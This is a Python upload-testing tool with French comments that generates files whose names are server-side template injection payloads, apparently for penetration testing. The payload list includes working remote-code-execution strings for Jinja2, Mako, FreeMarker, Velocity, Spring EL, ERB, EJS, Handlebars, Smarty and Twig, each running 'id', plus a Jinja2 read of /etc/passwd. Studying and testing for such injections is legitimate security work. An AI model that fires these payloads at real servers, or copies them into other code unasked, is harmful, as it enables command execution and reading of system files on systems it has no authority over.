from pathlib import Path
from PIL import Image

def generate_ssti_filename_payloads(output_dir, ext, burp_collab, tech_filter='all'):
    """
    Génère des fichiers avec des noms de fichiers SSTI pour tester l'injection via nom de fichier
    
    Args:
        output_dir: Répertoire de sortie
        ext: Extension ('pdf', 'png', 'jpg', 'svg', 'xml', 'html', etc.)
        burp_collab: URL Burp Collaborator (utilisé pour les payloads RCE si nécessaire)
        tech_filter: Filtre backend (ignoré pour les noms de fichiers, on génère tout)
    """
    output_dir = Path(output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)
    
    ssti_dir = output_dir / 'ssti'
    ssti_dir.mkdir(exist_ok=True)
    
    base_url = f"http://{burp_collab}"
    
    ssti_filenames = [
        ('{{7*7}}', ['python', 'php'], 'Jinja2/Twig - Test mathématique'),
        ('${7*7}', ['python', 'java'], 'Mako/FreeMarker/Velocity - Test mathématique'),
        ('#{7*7}', ['ruby'], 'Ruby string interpolation'),
        ('<%=7*7%>', ['ruby', 'nodejs'], 'ERB/EJS - Test mathématique'),
        ('<%25{7*7}', ['ruby'], 'ERB - Encodé'),
        ('{{7*\'7\'}}', ['python', 'php'], 'Jinja2/Twig - Test avec string'),
        ('${{7*7}}', ['python'], 'Mako - Double interpolation'),
        ('{% debug %}', ['python'], 'Django - Debug tag'),
        ('{{"".__class__}}', ['python'], 'Jinja2 - Accès à __class__'),
        ('${T(java.lang.Runtime)}', ['java'], 'Spring EL - Runtime class'),
        ('<#assign x=7*7>${x}', ['java'], 'FreeMarker - Assign et output'),
        ('#set($x=7*7)${x}', ['java'], 'Velocity - Set et output'),
        ('{{config.items()}}', ['python'], 'Jinja2/Flask - Accès à config'),
        ('@{7*7}', ['nodejs'], 'Handlebars - Test'),
        ('*{{7*7}}*', ['python', 'php'], 'Jinja2/Twig - Avec wildcards'),
        
        ('{{self.__init__.__globals__}}', ['python'], 'Jinja2 - Accès globals'),
        ('{{cycler.__init__.__globals__}}', ['python'], 'Jinja2 - Cycler globals'),
        ('{{lipsum.__globals__}}', ['python'], 'Jinja2 - Lipsum globals'),
        ('{{request.application.__globals__}}', ['python'], 'Jinja2/Flask - Request globals'),
        ('{{"".__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read()}}', ['python'], 'Jinja2 - File read'),
        ('{{"".__class__.__bases__[0].__subclasses__()[104].__init__.__globals__["sys"].modules["os"].popen("id").read()}}', ['python'], 'Jinja2 - RCE via subclasses'),
        
        ('${__import__("os").system("id")}', ['python'], 'Mako - RCE'),
        ('${self.module.cache.util.os.system("id")}', ['python'], 'Mako - RCE via cache'),
        ('${"freemarker.template.utility.Execute"?new()("id")}', ['java'], 'FreeMarker - RCE Execute'),
        ('<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}', ['java'], 'FreeMarker - RCE Execute assign'),
        ('$class.forName("java.lang.Runtime").getRuntime().exec("id")', ['java'], 'Velocity - RCE Runtime'),
        ('${T(java.lang.Runtime).getRuntime().exec("id")}', ['java'], 'Spring EL - RCE Runtime'),
        ('<%=system("id")%>', ['ruby'], 'ERB - RCE system'),
        ('<%=`id`%>', ['ruby'], 'ERB - RCE backtick'),
        ('<%=IO.popen("id").read%>', ['ruby'], 'ERB - RCE IO.popen'),
        ('<%-global.process.mainModule.require("child_process").exec("id")%>', ['nodejs'], 'EJS - RCE child_process'),
        ('{{#with "s" as |string|}}{{ "require" "child_process" "exec" "id" }}{{/with}}', ['nodejs'], 'Handlebars - RCE'),
        ('{system("id")}', ['php'], 'Smarty - RCE system'),
        ('{php}system("id");{/php}', ['php'], 'Smarty - RCE php tag'),
        ('{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}', ['php'], 'Twig - RCE via filter'),
        ('{{["id"]|filter("system")}}', ['php'], 'Twig - RCE via filter array'),
        
        ('{{7*7}}.backup', ['python', 'php'], 'Jinja2/Twig - Avec extension backup'),
        ('test_{{7*7}}_file', ['python', 'php'], 'Jinja2/Twig - Dans nom de fichier'),
        ('${7*7}.tmp', ['python', 'java'], 'Mako/FreeMarker - Avec extension tmp'),
        ('<%=7*7%>.old', ['ruby', 'nodejs'], 'ERB/EJS - Avec extension old'),
        ('file_{{7*7}}', ['python', 'php'], 'Jinja2/Twig - Préfixe file'),
        ('{{7*7}}_upload', ['python', 'php'], 'Jinja2/Twig - Suffixe upload'),
        ('img_{{7*7}}', ['python', 'php'], 'Jinja2/Twig - Préfixe img'),
        ('photo_{{7*7}}', ['python', 'php'], 'Jinja2/Twig - Préfixe photo'),
    ]
    
    for filename_template, backends, description in ssti_filenames:
        filename = f"{filename_template}.{ext}"
        file_path = ssti_dir / filename
        
        try:
            if ext in ['png', 'jpg', 'jpeg', 'gif']:
                img = Image.new('RGB', (10, 10), color='white')
                if ext == 'gif':
                    img.save(file_path, 'GIF')
                elif ext in ['jpg', 'jpeg']:
                    img.save(file_path, 'JPEG')
                else:
                    img.save(file_path, 'PNG')
            elif ext == 'pdf':
                pdf_content = '''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 4
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
100
%%EOF'''
                file_path.write_text(pdf_content)
            elif ext == 'svg':
                content = '<svg xmlns="http://www.w3.org/2000/svg"><rect width="100" height="100"/></svg>'
                file_path.write_text(content)
            elif ext == 'xml':
                content = '<?xml version="1.0"?><root><test>SSTI filename test</test></root>'
                file_path.write_text(content)
            elif ext in ['html', 'htm']:
                content = '<html><body>SSTI filename test</body></html>'
                file_path.write_text(content)
            elif ext in ['docx', 'xlsx', 'pptx', 'odt', 'ods', 'odp']:
                from zipfile import ZipFile
                with ZipFile(file_path, 'w') as zf:
                    zf.writestr('test.txt', 'SSTI filename test')
            elif ext in ['zip', 'jar', 'epub']:
                from zipfile import ZipFile
                with ZipFile(file_path, 'w') as zf:
                    zf.writestr('test.txt', 'SSTI filename test')
            elif ext in ['webm', 'mp4']:
                file_path.write_bytes(b'\x1a\x45\xdf\xa3')
            elif ext in ['txt', 'csv', 'rtf', 'md', 'markdown']:
                file_path.write_text(f"SSTI filename test: {filename_template}")
            else:
                file_path.write_text(f"SSTI filename test: {filename_template}")
        except Exception as e:
            pass

